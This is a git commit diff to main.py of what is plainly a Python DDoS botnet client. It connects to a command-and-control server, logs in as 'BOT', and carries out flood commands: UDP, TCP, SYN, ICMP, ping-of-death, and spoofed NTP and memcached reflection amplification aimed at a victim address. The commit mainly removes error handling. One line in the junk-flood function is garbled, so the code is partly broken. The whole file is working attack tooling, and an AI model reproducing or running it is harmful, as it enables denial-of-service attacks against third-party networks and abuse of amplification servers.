2070c4053805ba8daff319d4e004be51f4ffa2a7
Jaxploit <123088781+Jaxploit@users.noreply.github.com>
2025-04-02 19:15:31 +0200

    Update main.py

--- main.py
+++ main.py
@@ -16,72 +16,46 @@ C2_PORT = 21142
 
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
 def NTP(target, port, timer):
-    try:
-        with open("ntpServers.txt", "r") as f:
-            ntp_servers = f.readlines()
-        packets = random.randint(10, 150)
-    except Exception as e:
-        print(f"Erro: {e}")
-        pass
-
+    with open("ntpServers.txt", "r") as f:
+        ntp_servers = f.readlines()
+    packets = random.randint(10, 150)
     server = random.choice(ntp_servers).strip()
     while time.time() < timer:
-        try:
-            packet = (
-                    IP(dst=server, src=target)
-                    / UDP(sport=random.randint(1, 65535), dport=int(port))
-                    / Raw(load=ntp_payload)
-            )
-            try:
-                for _ in range(50000000):
-                    send(packet, count=packets, verbose=False)
-            except Exception as e:
-                pass
-        except Exception as e:
-            pass
+        packet = (
+                IP(dst=server, src=target)
+                / UDP(sport=random.randint(1, 65535), dport=int(port))
+                / Raw(load=ntp_payload)
+        )
+        for _ in range(50000000):
+            send(packet, count=packets, verbose=False)
 
 mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
 def MEM(target, port, timer):
     packets = random.randint(1024, 60000)
-    try:
-        with open("memsv.txt", "r") as f:
-            memsv = f.readlines()
-    except:
-        pass
+    with open("memsv.txt", "r") as f:
+        memsv = f.readlines()
     server = random.choice(memsv).strip()
     while time.time() < timer:
-        try:
-            try:
-                packet = (
-                        IP(dst=server, src=target)
-                        / UDP(sport=port, dport=11211)
-                        / Raw(load=mem_payload)
-                )
-                for _ in range(5000000):
-                    send(packet, count=packets, verbose=False)
-            except:
-                pass
-        except:
-            pass
+        packet = (
+                IP(dst=server, src=target)
+                / UDP(sport=port, dport=11211)
+                / Raw(load=mem_payload)
+        )
+        for _ in range(5000000):
+            send(packet, count=packets, verbose=False)
 
 def icmp(target, timer):
     while time.time() < timer:
-        try:
-            for _ in range(5000000):
-                packet = random._urandom(int(random.randint(1024, 60000)))
-                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
-        except:
-            pass
+        for _ in range(5000000):
+            packet = random._urandom(int(random.randint(1024, 60000)))
+            pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
 
 def pod(target, timer):
     while time.time() < timer:
-        try:
-            rand_addr = spoofer()
-            ip_hdr = IP(src=rand_addr, dst=target)
-            packet = ip_hdr / ICMP() / ("m" * 60000)
-            send(packet)
-        except:
-            pass
+        rand_addr = spoofer()
+        ip_hdr = IP(src=rand_addr, dst=target)
+        packet = ip_hdr / ICMP() / ("m" * 60000)
+        send(packet)
 
 def spoofer():
     addr = [192, 168, 0, 1]
@@ -103,37 +77,29 @@ def attack_udp(ip, port, secs, size=65500):
 def attack_tcp(ip, port, secs, size=65500):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((ip, port))
-            while time.time() < secs:
-                s.send(random._urandom(size))
-        except:
-            pass
+        s.connect((ip, port))
+        while time.time() < secs:
+            s.send(random._urandom(size))
 
 def attack_syn(ip, port, secs):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         flags = 0b01000000
-        try:
-            s.connect((ip, port))
-            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
-            while time.time() < secs:
-                s.send(pkt)
-        except:
-            s.close()
+        s.connect((ip, port))
+        pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
+        while time.time() < secs:
+            s.send(pkt)
+        s.close()
 
 def attack_tup(ip, port, secs, size=65500):
     while time.time() < secs:
         udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         dport = random.randint(1, 65535) if port == 0 else port
-        try:
-            data = random._urandom(size)
-            tcp.connect((ip, port))
-            udp.sendto(data, (ip, dport))
-            tcp.send(data)
-        except:
-            pass
+        data = random._urandom(size)
+        tcp.connect((ip, port))
+        udp.sendto(data, (ip, dport))
+        tcp.send(data)
 
 def attack_hex(ip, port, secs):
     payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
@@ -170,136 +136,119 @@ def attack_junk(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
+        s.sendto(payload  s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
 
 def handle_c2_connection(c2):
-    try:
-        c2.send('669787761736865726500'.encode())
-        while True:
-            time.sleep(1)
-            data = c2.recv(1024).decode()
-            if 'Username' in data:
-                c2.send('BOT'.encode())
-                break
-        while True:
-            time.sleep(1)
-            data = c2.recv(1024).decode()
-            if 'Password' in data:
-                c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
-                break
-        while True:
-            data = c2.recv(1024).decode().strip()
-            if not data:
-                raise Exception
-            args = data.split(' ')
-            command = args[0].upper()
-            if command == '!UDP':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
-            elif command == '!TCP':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-            elif command == '!HEX':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
-            elif command == '!ROBLOX':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=attack_roblox, args=(ip, port, secs), daemon=True).start()
-            elif command == '!JUNK':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
-                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
-                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-             elif command == '!NTP':
-                ip = args[1]
-                port = int(args[2])
-                timer = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()
-            elif command == '!MEM':
-                ip = args[1]
-                porttimer = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()
-            elif command == '!ICMP':
-                ip = args[1]
-                timer = time.time() + int(args[2])
-                threads = int(args[3])
-                for _ in range(threads):
-                    threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()
-            elif command == '!POD':
-                ip = args[1]
-                timer = time.time() + int(args[2])
-                threads = int(args[3])
-                for _ in range(threads):
-                    threading.Thread(target=pod, args=(ip, timer), daemon=True).start()
-            elif command == '!SYN':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()
-            elif command == '!PING':
-                c2.send('PONG'.encode())
-    except:
-        c2.close()
+    c2.send('669787761736865726500'.encode())
+    while True:
+        time.sleep(1)
+        data = c2.recv(1024).decode()
+        if 'Username' in data:
+            c2.send('BOT'.encode())
+            break
+    while True:
+        time.sleep(1)
+        data = c2.recv(1024).decode()
+        if 'Password' in data:
+            c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
+            break
+    while True:
+        data = c2.recv(1024).decode().strip()
+        if not data:
+            raise Exception
+        args = data.split(' ')
+        command = args[0].upper()
+        if command == '!UDP':
+            ip = args[1]
+            port = int(args[2])
+            secs = time.time() + int(args[3])
+            threads = int(args[4])
+            for _ in range(threads):
+                threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
+        elif command == '!TCP':
+            ip = args[1]
+            port = int(args[2])
+            secs = time.time() + int(args[3])
+            threads = int(args[4])
+            for _ in range(threads):
+                threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
+        elif command == '!HEX':
+            ip = args[1]
+            port = int(args[2])
+            secs = time.time() + int(args[3])
+            threads = int(args[4])
+            for _ in range(threads):
+                threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
+        elif command == '!ROBLOX':
+            ip = args[1]
+            port = int(args[2])
+            secs = time.time() + int(args[3])
+            threads = int(args[4])
+            for _ in range(threads):
+                threading.Thread(target=attack_roblox, args=(ip, port, secs), daemon=True).start()
+        elif command == '!JUNK':
+            ip = args[1]
+            port = int(args[2])
+            secs = time.time() + int(args[3])
+            threads = int(args[4])
+            for _ in range(threads):
+                threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
+                threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
+                threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
+        elif command == '!NTP':
+            ip = args[1]
+            port = int(args[2])
+            timer = time.time() + int(args[3])
+            threads = int(args[4])
+            for _ in range(threads):
+                threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()
+        elif command == '!MEM':
+            ip = args[1]
+            port = int(args[2])
+            timer = time.time() + int(args[3])
+            threads = int(args[4])
+            for _ in range(threads):
+                threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()
+        elif command == '!ICMP':
+            ip = args[1]
+            timer = time.time() + int(args[2])
+            threads = int(args[3])
+            for _ in range(threads):
+                threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()
+        elif command == '!POD':
+            ip = args[1]
+            timer = time.time() + int(args[2])
+            threads = int(args[3])
+            for _ in range(threads):
+                threading.Thread(target=pod, args=(ip, timer), daemon=True).start()
+        elif command == '!SYN':
+            ip = args[1]
+            port = int(args[2])
+            secs = time.time() + int(args[3])
+            threads = int(args[4])
+            for _ in range(threads):
+                threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
+        elif command == '!PING':
+            c2.send('PONG'.encode())
+    c2.close()
 
 def reconnect_thread():
     while True:
-        try:
-            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            c2.connect((C2_ADDRESS, C2_PORT))
-            threading.Thread(target=handle_c2_connection, args=(c2,), daemon=True).start()
-        except:
-            if 'c2' in locals():
-                c2.close()
+        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        c2.connect((C2_ADDRESS, C2_PORT))
+        threading.Thread(target=handle_c2_connection, args=(c2,), daemon=True).start()
         time.sleep(1)
 
 def main():
     while True:
-        try:
-            print("Starting script...")
-            threading.Thread(target=reconnect_thread, daemon=True).start()
-            while True:
-                time.sleep(30)
-        except Exception as e:
-            print(f"Error occurred: {e}")
-        finally:
-            print("Restarted script")
+        threading.Thread(target=reconnect_thread, daemon=True).start()
+        while True:
             time.sleep(30)
 
 if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("Script terminated by user")
-    except Exception as e:
-        print(f"Fatal error: {e}")
+    main()
